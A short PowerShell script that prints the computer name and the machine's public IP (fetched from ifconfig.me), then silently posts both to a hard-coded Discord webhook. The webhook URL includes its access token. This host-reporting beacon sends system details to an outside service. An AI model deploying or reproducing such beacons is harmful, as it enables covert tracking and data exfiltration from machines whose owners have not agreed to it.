param (
  [string]$var1
)

$URL = "https://discordapp.com/api/webhooks/1275806536853360721/33x2JRHpS4QPusXR3oSRPn2z8V1ALPejJcXKlgm56hEH5Q8iYjNI40GJI_y8WXO6x17R"

Write-Output "Hello, $Env:ComputerName!"
$IP = Invoke-WebRequest("ifconfig.me")
Write-Output "IP: $IP"
Write-Output "Variable: $var1"

$msg = @{
    content = "Script has been run from $Env:ComputerName at IP $IP."
} | ConvertTo-Json

Invoke-WebRequest -Uri $URL -Method Post -Body $msg -ContentType "application/json" | Out-Null
